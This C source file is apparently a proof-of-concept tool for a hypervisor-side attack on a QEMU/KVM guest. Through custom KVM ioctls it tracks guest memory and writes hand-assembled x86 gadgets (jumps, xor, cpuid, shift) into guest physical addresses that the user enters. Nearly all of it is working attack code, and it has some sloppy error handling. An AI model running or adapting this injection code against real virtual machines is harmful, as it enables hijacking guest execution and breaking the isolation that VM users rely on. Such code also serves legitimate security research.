
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <stdint.h>
#include <string.h>

#include <errno.h>
#include <limits.h> //ULONG_MAX

#include "my_kvm_ioctls.h"

int do_stroul(char *str, int base, uint64_t *result) {
  (*result) = strtoul(str, NULL, 16);
  if ((*result) == 0) {
    printf("line %d: failed to convert %s to uint64_t\n", __LINE__, str);
    return 1;
  }
  if ((*result) == ULONG_MAX && errno == ERANGE) {
    printf("line %d: failed to convert %s to uint64_t. errno was ERANGE\n",
           __LINE__, str);
    return 1;
  }
  return 0;
}

int main(int argc, char **argv) {
  int err, ret;
  ret = 0;

  if (argc != 2) {
    printf("Usage: injection <pid of qemu>\n");
    return 1;
  }

  int fd_kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC);
  if (fd_kvm == -1) {
    perror("failed to open /dev/kvm");
    ret = -1;
    goto finish;
  }
  printf("opened /dev/kvm\n");

  // dummy call to test connection
  err = ioctl(fd_kvm, KVM_GET_API_VERSION, NULL);
  if (err == -1) {
    perror("ioctl(fd_kvm,KVM_GET_API_VERSION) failed");
    ret = -1;
    goto finish;
  }
  if (err > 0) {
    printf("ioctl(fd_kvm,KVM_GET_API_VERSION) returned: %d\n", err);
  }

  // start of load gadget
  size_t injection_count = 11;
  inject_param_t *injections =
      (inject_param_t *)malloc(injection_count * sizeof(inject_param_t));
  // jmp to next location
  injections[0].length = 2;
  injections[0].injection_code_buffer = (uint8_t *)malloc(injections[0].length);
  injections[0].injection_code_buffer[0] = 0xeb;
  injections[0].injection_code_buffer[1] = 0x1c;
  injections[0].insert_at_back = 0;

  // xor eax,eax
  injections[1].length = 2;
  injections[1].injection_code_buffer = (uint8_t *)malloc(injections[1].length);
  injections[1].injection_code_buffer[0] = 0x31;
  injections[1].injection_code_buffer[1] = 0xc0;
  injections[1].insert_at_back = 1;

  // jmp
  injections[2] = injections[0];

  // xor esi esi
  injections[3].length = 2;
  injections[3].injection_code_buffer = (uint8_t *)malloc(injections[3].length);
  injections[3].injection_code_buffer[0] = 0x31;
  injections[3].injection_code_buffer[1] = 0xf6;
  injections[3].insert_at_back = 1;

  // jmp
  injections[4] = injections[0];

  // cpuid
  injections[5].length = 2;
  injections[5].injection_code_buffer = (uint8_t *)malloc(injections[5].length);
  injections[5].injection_code_buffer[0] = 0x0f;
  injections[5].injection_code_buffer[1] = 0xa2;
  injections[5].insert_at_back = 1;

  // jmp
  injections[6] = injections[0];

  // inc esi,
  // depending on the value we want to write, this gets overwritten by the
  // hypverisor handler
  injections[7].length = 2;
  injections[7].injection_code_buffer = (uint8_t *)malloc(injections[7].length);
  injections[7].injection_code_buffer[0] = 0xff;
  injections[7].injection_code_buffer[1] = 0xc6;
  injections[7].insert_at_back = 1;

  // jmp
  injections[8] = injections[0];

  // shl esi
  injections[9].length = 2;
  injections[9].injection_code_buffer = (uint8_t *)malloc(injections[9].length);
  injections[9].injection_code_buffer[0] = 0xd1;
  injections[9].injection_code_buffer[1] = 0xe6;
  injections[9].insert_at_back = 1;

  // jump back to cpuid
  injections[10].length = 2;
  injections[10].injection_code_buffer =
      (uint8_t *)malloc(injections[10].length);
  injections[10].injection_code_buffer[0] = 0xeb;
  injections[10].injection_code_buffer[1] = 0xbc;
  injections[10].insert_at_back = 0;

  injections[10].target_value = 0xffc6eb1a;
  injections[10].prev_prev_eax = 0x0;
  injections[10].prev_eax = 0xd;
  injections[10].type = 1;
  // end of load gadget

  /*
  // start of stack detect gadget
  size_t injection_count = 6;
  inject_param_t *injections =
      (inject_param_t *)malloc(injection_count * sizeof(inject_param_t));
  // jmp to next location
  injections[0].length = 2;
  injections[0].injection_code_buffer = (uint8_t *)malloc(injections[0].length);
  injections[0].injection_code_buffer[0] = 0xeb;
  injections[0].injection_code_buffer[1] = 0x1c;
  injections[0].insert_at_back = 0;

  // call cpuid
  injections[1].length = 2;
  injections[1].injection_code_buffer = (uint8_t *)malloc(injections[1].length);
  injections[1].injection_code_buffer[0] = 0x0f;
  injections[1].injection_code_buffer[1] = 0xa2;
  injections[1].insert_at_back = 1;

  // jmp to next injection
  injections[2] = injections[0];

  // push rdi ; pop rdi
  injections[3].length = 2;
  injections[3].injection_code_buffer = (uint8_t *)malloc(injections[3].length);
  injections[3].injection_code_buffer[0] = 0x57;
  injections[3].injection_code_buffer[1] = 0x5f;
  injections[3].insert_at_back = 1;

  // jmp to next injection
  injections[4] = injections[0];

  // call cpuid
  injections[5].length = 2;
  injections[5].injection_code_buffer = (uint8_t *)malloc(injections[5].length);
  injections[5].injection_code_buffer[0] = 0x0f;
  injections[5].injection_code_buffer[1] = 0xa2;
  injections[5].insert_at_back = 1;

  injections[5].target_value = 0x0;
  injections[5].prev_prev_eax = 0x0;
  injections[5].prev_eax = 0xd;
  injections[5].type = 2;
  // end of stack detect gadget
  */

  // start tracking (map known plaintext to gpas
  printf("C Prog: Got called with pid %s\n", argv[1]);
  str_pid_param_t str_pid_param;
  strcpy(str_pid_param.str_pid, argv[1]);
  printf("C Prog- param value %s", str_pid_param.str_pid);
  err = ioctl(fd_kvm, KVM_TRACKING_ENABLE, &str_pid_param);
  if (err == -1) {
    perror("ioctl(fd_kvm,KVM_TRACKING_ENABLE) failed");
    ret = -1;
    goto finish;
  }
  if (err > 0) {
    printf("ioctl(fd_kvm,KVM_TRACKING_ENABLE) returned: %d", err);
  }

  printf("enter target gpa to start injection. Enter 0 to stop\n");
  uint64_t gpa;
  scanf("%lx", &gpa);

  while (gpa != 0) {
    printf("you entered gpa=%016lx\n", gpa);

    for (int inj_index = 0; inj_index < injection_count;
         inj_index++, gpa += 16) {
      injections[inj_index].gpa = gpa;

      ioctl(fd_kvm, KVM_INJECT_CODE, &(injections[inj_index]));
      if (err == -1) {
        perror("ioctl(fd_kvm,KVM_INJECT_CODE) failed\n");
        ret = -1;
        goto finish;
      }
      if (err > 0) {
        printf("ioctl(fd_kvm,INJECT_CODE) returned: %d\n", err);
      }
    }

    printf("enter target gpa to start another injection. Enter 0 to stop\n");
    scanf("%lx", &gpa);
  }

finish:
  // stop tracking
  err = ioctl(fd_kvm, KVM_TRACKING_DISABLE, &str_pid_param);
  if (err == -1) {
    perror("ioctl(fd_kvm,KVM_TRACKING_DISABLE) failed");
    ret = -1;
    goto finish;
  }
  if (err > 0) {
    printf("ioctl(fd_kvm,KVM_TRACKING_DISABLE) returned: %d", err);
  }
  close(fd_kvm);
  if (injections != NULL) {
    for (int inj_index = 0; inj_index < injection_count; inj_index++) {
      free((void *)injections[inj_index].injection_code_buffer);
    }
  }
  free(injections);

  return ret;
}
